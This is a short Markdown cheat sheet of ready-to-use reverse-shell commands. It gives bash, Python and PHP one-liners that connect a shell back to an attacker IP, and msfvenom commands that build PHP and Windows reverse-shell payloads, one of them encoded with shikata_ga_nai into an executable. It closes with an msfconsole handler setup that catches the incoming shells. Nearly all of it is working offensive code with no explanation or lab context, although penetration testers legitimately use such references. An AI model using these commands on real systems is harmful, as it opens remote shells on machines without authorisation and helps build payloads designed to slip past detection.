## Linux TCP Socket shell
```
bash -i >& /dev/tcp/10.10.10.10/443 0>&1
```

### Python Reverse shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("my-ip",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
### php reverse shell
```
<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
```

## msfvenom cheat sheet

### PHP Reverse shell
```
msfvenom -p php/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -f raw
``` 

### windows reverse shell
```
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<local_ip> LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o v.exe
```

### Encoded Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4545 -f c -e x86/shikata_ga_nai

## msfconsole
```
root@kali:~$ msfconsole
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.10
lhost => 192.168.1.10
msf exploit(multi/handler) > set lport 4444
lport => 4444
msf exploit(multi/handler) > run
```
